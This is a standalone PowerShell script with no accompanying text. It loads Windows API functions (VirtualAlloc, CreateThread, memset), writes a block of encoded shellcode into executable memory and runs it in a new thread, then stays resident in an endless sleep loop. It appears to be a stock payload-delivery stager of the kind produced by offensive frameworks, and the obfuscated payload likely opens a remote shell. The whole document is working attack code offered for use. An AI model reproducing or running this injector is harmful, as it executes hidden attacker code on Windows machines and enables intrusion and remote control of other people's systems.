
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xe3,0x08,0xf0,0x63,0xd9,0xc2,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xb1,0x47,0x31,0x73,0x13,0x83,0xc3,0x04,0x03,0x73,0xec,0xea,0x05,0x9f,0x1a,0x68,0xe5,0x60,0xda,0x0d,0x6f,0x85,0xeb,0x0d,0x0b,0xcd,0x5b,0xbe,0x5f,0x83,0x57,0x35,0x0d,0x30,0xec,0x3b,0x9a,0x37,0x45,0xf1,0xfc,0x76,0x56,0xaa,0x3d,0x18,0xd4,0xb1,0x11,0xfa,0xe5,0x79,0x64,0xfb,0x22,0x67,0x85,0xa9,0xfb,0xe3,0x38,0x5e,0x88,0xbe,0x80,0xd5,0xc2,0x2f,0x81,0x0a,0x92,0x4e,0xa0,0x9c,0xa9,0x08,0x62,0x1e,0x7e,0x21,0x2b,0x38,0x63,0x0c,0xe5,0xb3,0x57,0xfa,0xf4,0x15,0xa6,0x03,0x5a,0x58,0x07,0xf6,0xa2,0x9c,0xaf,0xe9,0xd0,0xd4,0xcc,0x94,0xe2,0x22,0xaf,0x42,0x66,0xb1,0x17,0x00,0xd0,0x1d,0xa6,0xc5,0x87,0xd6,0xa4,0xa2,0xcc,0xb1,0xa8,0x35,0x00,0xca,0xd4,0xbe,0xa7,0x1d,0x5d,0x84,0x83,0xb9,0x06,0x5e,0xad,0x98,0xe2,0x31,0xd2,0xfb,0x4d,0xed,0x76,0x77,0x63,0xfa,0x0a,0xda,0xeb,0xcf,0x26,0xe5,0xeb,0x47,0x30,0x96,0xd9,0xc8,0xea,0x30,0x51,0x80,0x34,0xc6,0x96,0xbb,0x81,0x58,0x69,0x44,0xf2,0x71,0xad,0x10,0xa2,0xe9,0x04,0x19,0x29,0xea,0xa9,0xcc,0xc4,0xef,0x3d,0x5d,0x51,0x2a,0x6b,0xc9,0x60,0xca,0x8c,0x9a,0xec,0x2c,0xe2,0xca,0xbe,0xe0,0x42,0xbb,0x7e,0x51,0x2a,0xd1,0x70,0x8e,0x4a,0xda,0x5a,0xa7,0xe0,0x35,0x33,0x9f,0x9c,0xac,0x1e,0x6b,0x3d,0x30,0xb5,0x11,0x7d,0xba,0x3a,0xe5,0x33,0x4b,0x36,0xf5,0xa3,0xbb,0x0d,0xa7,0x65,0xc3,0xbb,0xc2,0x89,0x51,0x40,0x45,0xde,0xcd,0x4a,0xb0,0x28,0x52,0xb4,0x97,0x23,0x5b,0x20,0x58,0x5b,0xa4,0xa4,0x58,0x9b,0xf2,0xae,0x58,0xf3,0xa2,0x8a,0x0a,0xe6,0xac,0x06,0x3f,0xbb,0x38,0xa9,0x16,0x68,0xea,0xc1,0x94,0x57,0xdc,0x4d,0x66,0xb2,0xdc,0xb2,0xb1,0xfa,0xaa,0xda,0x01;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

